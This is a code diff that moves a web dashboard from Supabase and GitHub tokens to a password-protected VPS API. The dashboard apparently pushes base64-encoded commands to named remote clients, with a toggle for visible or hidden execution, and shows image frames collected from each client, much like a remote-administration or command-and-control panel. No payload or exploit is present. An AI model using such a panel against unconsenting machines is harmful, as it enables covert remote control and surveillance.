@@ -2128,9 +2128,11 @@
 
     <script id="mod-frames-app">
         const FramesApp = (() => {
-            const user = "yuan-miranda", repo = "frames";
-            const githubTokenKey = 'github_token';
-            let githubToken = localStorage.getItem(githubTokenKey) || '';
+            function getVpsUrl() { return localStorage.getItem('vps_url') || ''; }
+            function getVpsPassword() { return sessionStorage.getItem('vps_password') || ''; }
+            function authHeaders(extra = {}) {
+                return { ...extra, 'x-password': getVpsPassword() };
+            }
             let isInitialized = false;
 
             const state = {
@@ -2292,17 +2294,12 @@
                 }, Math.round(1000 / (state.fps || 12)));
             }
 
-            // ── GitHub token ──
-            function setGithubToken(token) {
-                githubToken = (token || '').trim();
-                if (githubToken) localStorage.setItem(githubTokenKey, githubToken);
-                else localStorage.removeItem(githubTokenKey);
-            }
-            function getGithubToken() { return githubToken; }
+            // ── (no-op stubs kept for API compat) ──
+            function setGithubToken() {}
+            function getGithubToken() { return ''; }
 
             // ── Reset ──
-            function resetFramesState({ clearToken = false } = {}) {
-                if (clearToken) setGithubToken('');
+            function resetFramesState() {
                 Object.assign(state, {
                     currentFolder: null, urls: [], imagesMeta: [], total: 0, idx: 0,
                     viewInitialized: false, restoreView: null, error: null
@@ -2317,20 +2314,17 @@
                 const sfn = $('sidebar-file-name');
                 if (sfn) sfn.textContent = 'no file';
                 if (els.dropdownMenu) els.dropdownMenu.innerHTML = '';
-                if (els.folderName) els.folderName.textContent = clearToken ? 'token required' : 'loading...';
-                if (els.statusmsg) {
-                    els.statusmsg.style.display = '';
-                    els.statusmsg.textContent = clearToken ? 'missing github token' : 'loading...';
-                }
+                if (els.folderName) els.folderName.textContent = 'loading...';
+                if (els.statusmsg) { els.statusmsg.style.display = ''; els.statusmsg.textContent = 'loading...'; }
                 syncControlStates();
             }
 
             function initFoldersIfReady() {
                 if (!isInitialized) return false;
-                if (!githubToken) {
-                    state.error = 'missing github token';
-                    els.folderName.textContent = 'token required';
-                    els.statusmsg.textContent = 'missing github token';
+                if (!getVpsUrl()) {
+                    state.error = 'VPS URL not configured';
+                    els.folderName.textContent = 'url required';
+                    els.statusmsg.textContent = 'VPS URL not configured';
                     syncControlStates();
                     return false;
                 }
@@ -2338,15 +2332,15 @@
                 return true;
             }
 
-            // ── GitHub API ──
-            async function fetchWithAuth(url) {
-                if (!githubToken) throw new Error('missing github token');
-                return fetch(url, { headers: { Authorization: 'Bearer ' + githubToken } });
-            }
-            async function fetchGitTree() {
-                const res = await fetchWithAuth(`https://api.github.com/repos/${user}/${repo}/git/trees/main?recursive=1`);
+            // ── VPS API ──
+            async function fetchFrameFiles(username) {
+                const base = getVpsUrl();
+                if (!base) throw new Error('VPS URL not configured');
+                const res = await fetch(`${base}/api/frames/${encodeURIComponent(username)}`, {
+                    headers: authHeaders()
+                });
                 if (!res.ok) throw new Error('error ' + res.status);
-                return (await res.json()).tree || [];
+                return await res.json();
             }
 
             // ── Download ──
@@ -2357,7 +2351,10 @@
                 const a = document.createElement('a');
                 a.download = name;
                 try {
-                    const res = await fetch(url, { mode: 'cors' });
+                    const res = await fetch(url, {
+                        mode: 'cors',
+                        headers: authHeaders()
+                    });
                     if (!res.ok) throw new Error('download failed');
                     const blobUrl = URL.createObjectURL(await res.blob());
                     a.href = blobUrl;
@@ -2370,6 +2367,25 @@
             }
 
             // ── Preload ──
+            async function loadAuthenticatedImages(urls) {
+                const loaded = [];
+                for (const url of urls) {
+                    try {
+                        const res = await fetch(url, {
+                            mode: 'cors',
+                            headers: authHeaders()
+                        });
+                        if (!res.ok) throw new Error('image error ' + res.status);
+                        const blob = await res.blob();
+                        loaded.push(URL.createObjectURL(blob));
+                    } catch (e) {
+                        console.error('Image load error', e);
+                        loaded.push(url);
+                    }
+                }
+                return loaded;
+            }
+
             function preloadImages(urls) {
                 return new Promise(resolve => {
                     let done = 0;
@@ -2405,10 +2421,10 @@
                 Object.assign(state, { urls: [], imagesMeta: [], total: 0, idx: 0, viewInitialized: false, restoreView: null });
                 syncControlStates();
                 try {
-                    const tree = await fetchGitTree();
-                    const images = tree
-                        .filter(e => e.type === 'blob' && e.path.startsWith(folder + '/') && /\.(png|jpe?g)$/i.test(e.path))
-                        .map(e => ({ name: e.path.split('/').pop(), path: e.path, sha: e.sha }));
+                    const files = await fetchFrameFiles(folder);
+                    const images = files
+                        .filter(f => /\.(png|jpe?g)$/i.test(f))
+                        .map(f => ({ name: f }));
                     images.sort((a, b) => {
                         const na = extractNumber(a.name), nb = extractNumber(b.name);
                         if (na !== null && nb !== null) return na - nb;
@@ -2422,8 +2438,9 @@
                         setLoading(false); return;
                     }
                     state.imagesMeta = images; state.total = images.length;
-                    const base = `https://raw.githack.com/${user}/${repo}/main/${folder}`;
-                    state.urls = images.map(img => `${base}/${encodeURIComponent(img.name)}${img.sha ? '?sha=' + img.sha : ''}`);
+                    const base = `${getVpsUrl()}/frames/${encodeURIComponent(folder)}`;
+                    const imageUrls = images.map(img => `${base}/${encodeURIComponent(img.name)}`);
+                    state.urls = await loadAuthenticatedImages(imageUrls);
                     await preloadImages(state.urls);
                     els.slider.max = state.total - 1;
                     els.controlsRow.style.display = 'flex';
@@ -2441,9 +2458,13 @@
 
             async function initFolders() {
                 try {
-                    const res = await fetchWithAuth(`https://api.github.com/repos/${user}/${repo}/contents/`);
+                    const base = getVpsUrl();
+                    const res = await fetch(`${base}/api/clients`, {
+                        headers: authHeaders()
+                    });
                     if (!res.ok) throw new Error('error ' + res.status);
-                    const folders = (await res.json()).filter(f => f.type === 'dir');
+                    const clients = await res.json();
+                    const folders = clients.map(c => ({ name: c.username }));
                     els.dropdownMenu.innerHTML = '';
                     const sidebarList = $('sidebar-folder-list');
                     if (sidebarList) sidebarList.innerHTML = '';
@@ -2714,8 +2735,8 @@
         const RunApp = (() => {
             const runState = {
                 rows: [], sortedRows: [],
-                url: localStorage.getItem('supa_url'),
-                apiKey: localStorage.getItem('supa_key'),
+                url: localStorage.getItem('vps_url'),
+                password: sessionStorage.getItem('vps_password') || '',
                 popupMode: null, popupUser: null,
                 selectedVoice: 'David', selectedVis: true, activeUsername: null, interactionMode: null,
                 lastRenderSignature: null, fetchInFlight: false, isConnected: false,
@@ -2769,10 +2790,13 @@
             }
 
             // ── Connection ──
-            function setStoredCredentials(url, apiKey) {
-                runState.url = url; runState.apiKey = apiKey;
-                if (url && apiKey) { localStorage.setItem('supa_url', url); localStorage.setItem('supa_key', apiKey); }
-                else { localStorage.removeItem('supa_url'); localStorage.removeItem('supa_key'); }
+            function setStoredCredentials(url, password = runState.password) {
+                runState.url = url;
+                runState.password = password || '';
+                if (url) { localStorage.setItem('vps_url', url); }
+                else { localStorage.removeItem('vps_url'); }
+                if (runState.password) sessionStorage.setItem('vps_password', runState.password);
+                else sessionStorage.removeItem('vps_password');
             }
             function setConnectionState(connected) {
                 runState.isConnected = !!connected;
@@ -2784,49 +2808,47 @@
                 });
             }
             function disconnectAndReset() {
-                setStoredCredentials(null, null); setConnectionState(false);
+                setStoredCredentials(null, ''); setConnectionState(false);
                 runState.rows = []; runState.sortedRows = []; runState.lastRenderSignature = null;
                 renderGrid();
-                if (typeof FramesApp?.resetFramesState === 'function') FramesApp.resetFramesState({ clearToken: true });
-                else localStorage.removeItem('github_token');
+                if (typeof FramesApp?.resetFramesState === 'function') FramesApp.resetFramesState();
             }
-            async function validateSupabaseCredentials(url, apiKey) {
-                if (!url || !apiKey) return false;
+            async function validateVpsConnection(url, password) {
+                if (!url || !password) return false;
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 7000);
                 try {
-                    const res = await fetch(`${url}?select=username&limit=1`, {
-                        headers: { apikey: apiKey, Authorization: `Bearer ${apiKey}` },
-                        signal: controller.signal
+                    const res = await fetch(`${url}/api/clients`, {
+                        signal: controller.signal,
+                        headers: { 'x-password': password }
                     });
                     return res.ok;
                 } catch { return false; } finally { clearTimeout(timeoutId); }
             }
-            async function connectWithCredentials(url, apiKey, { notifyOnFail = true } = {}) {
-                const isValid = await validateSupabaseCredentials(url, apiKey);
+            async function connectWithCredentials(url, { notifyOnFail = true } = {}) {
+                const isValid = await validateVpsConnection(url, runState.password);
                 if (!isValid) {
-                    setStoredCredentials(null, null); setConnectionState(false);
-                    if (notifyOnFail) alert('Connection failed. URL/token were reset. Please reconnect.');
+                    setStoredCredentials(null, ''); setConnectionState(false);
+                    if (notifyOnFail) alert('Connection failed. URL was reset. Please reconnect.');
                     return false;
                 }
-                setStoredCredentials(url, apiKey); setConnectionState(true);
+                setStoredCredentials(url, runState.password); setConnectionState(true);
                 fetchData(); return true;
             }
             async function promptAndConnect() {
                 const ok = promptAllCredentials();
                 if (!ok) return;
-                await connectWithCredentials(runState.url.trim(), runState.apiKey.trim(), { notifyOnFail: true });
+                await connectWithCredentials(runState.url.trim(), { notifyOnFail: true });
             }
             function promptAllCredentials() {
-                const urlInput = prompt('Supabase URL:', runState.url || '');
+                const urlInput = prompt('VPS URL (e.g. http://your-vps:8000):', runState.url || '');
                 if (!urlInput) return false;
-                const apiInput = prompt('API Key:', runState.apiKey || '');
-                if (!apiInput) return false;
-                const ghInput = prompt('GitHub token (read-only):', FramesApp.getGithubToken() || '');
-                if (!ghInput) return false;
+
+                const passwordInput = prompt('Dashboard password:');
+                if (passwordInput === null || !passwordInput) return false;
+
                 runState.url = urlInput.trim();
-                runState.apiKey = apiInput.trim();
-                FramesApp.setGithubToken(ghInput.trim());
+                runState.password = passwordInput;
                 return true;
             }
 
@@ -3119,14 +3141,21 @@
                     }
                 }
 
-                const body = {};
-                // Encode the outbound command for transport/storage in Supabase.
-                if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
-                if (mode === 'cmd') body.visible = runState.selectedVis;
-
-                const headers = { apikey: runState.apiKey, Authorization: `Bearer ${runState.apiKey}`, 'Content-Type': 'application/json' };
+                if (!rawCmd && mode !== 'cmd') { closePopup(); return; }
+                const body = {
+                    username: user.username,
+                    cmd: rawCmd ? btoa(rawCmd) : '',
+                    visible: runState.selectedVis ? 1 : 0
+                };
                 try {
-                    await fetch(`${runState.url}?username=eq.${user.username}`, { method: 'PATCH', headers, body: JSON.stringify(body) });
+                    await fetch(`${runState.url}/api/command`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'x-password': runState.password
+                        },
+                        body: JSON.stringify(body)
+                    });
                     closePopup(); fetchData();
                 } catch (e) { console.error('Send error', e); }
             }
@@ -3137,20 +3166,16 @@
                     navigator.clipboard.writeText(out).catch(() => { });
                     alert(out); return;
                 }
-                try {
-                    const headers = { apikey: runState.apiKey, Authorization: `Bearer ${runState.apiKey}` };
-                    const res = await fetch(`${runState.url}?select=out&username=eq.${user.username}`, { headers });
-                    const data = await res.json();
-                    if (data[0]?.out) { const decoded = atob(data[0].out); navigator.clipboard.writeText(decoded).catch(() => { }); alert(decoded); }
-                } catch (e) { console.error(e); }
+                alert(`[${getDisplayUsername(user.username)}]\nCommand output capture is not yet available.`);
             }
 
             async function fetchData() {
-                if (!runState.url || !runState.apiKey || !runState.isConnected || runState.fetchInFlight) return;
+                if (!runState.url || !runState.isConnected || runState.fetchInFlight) return;
                 runState.fetchInFlight = true;
                 try {
-                    const headers = { apikey: runState.apiKey, Authorization: `Bearer ${runState.apiKey}` };
-                    const res = await fetch(`${runState.url}?select=username,updated_at,visible`, { headers });
+                    const res = await fetch(`${runState.url}/api/clients`, {
+                        headers: { 'x-password': runState.password }
+                    });
                     const serverDate = res.headers.get('date');
                     if (serverDate) runState.serverTimeOffset = new Date(serverDate).getTime() - Date.now();
                     const nextRows = await res.json();
@@ -3171,11 +3196,15 @@
                 const idx = runState.rows.findIndex(r => r.username === runState.popupUser.username);
                 if (idx !== -1) runState.rows[idx] = { ...runState.rows[idx], visible: runState.selectedVis };
                 updateOptionsUI(); renderGrid();
-                if (!runState.isConnected || !runState.url || !runState.apiKey || runState.popupUser.demo) return;
+                if (!runState.isConnected || !runState.url || runState.popupUser.demo) return;
                 try {
-                    const headers = { apikey: runState.apiKey, Authorization: `Bearer ${runState.apiKey}`, 'Content-Type': 'application/json' };
-                    await fetch(`${runState.url}?username=eq.${runState.popupUser.username}`, {
-                        method: 'PATCH', headers, body: JSON.stringify({ visible: runState.selectedVis })
+                    await fetch(`${runState.url}/api/visibility`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'x-password': runState.password
+                        },
+                        body: JSON.stringify({ username: runState.popupUser.username, visible: runState.selectedVis ? 1 : 0 })
                     });
                 } catch (e) { console.error('Visibility sync error', e); }
             }
@@ -3334,17 +3363,17 @@
                 });
 
                 // Initial connection
-                if (!runState.url || !runState.apiKey || !FramesApp.getGithubToken()) {
+                if (!runState.url) {
                     const ok = promptAllCredentials();
                     if (!ok) { renderGrid(); }
-                    else if (runState.url && runState.apiKey) {
+                    else if (runState.url) {
                         $('user-grid').innerHTML = '<div class="empty">Connecting...</div>';
-                        connectWithCredentials(runState.url, runState.apiKey, { notifyOnFail: false }).then(ok => { if (!ok) renderGrid(); });
+                        connectWithCredentials(runState.url, { notifyOnFail: false }).then(ok => { if (!ok) renderGrid(); });
                     } else { renderGrid(); }
-                } else if (runState.url && runState.apiKey) {
+                } else {
                     $('user-grid').innerHTML = '<div class="empty">Connecting...</div>';
-                    connectWithCredentials(runState.url, runState.apiKey, { notifyOnFail: false }).then(ok => { if (!ok) renderGrid(); });
-                } else { renderGrid(); }
+                    connectWithCredentials(runState.url, { notifyOnFail: false }).then(ok => { if (!ok) renderGrid(); });
+                }
 
                 $('popup-cancel').onclick = closePopup;
                 $('popup-confirm').onclick = doSendPopup;
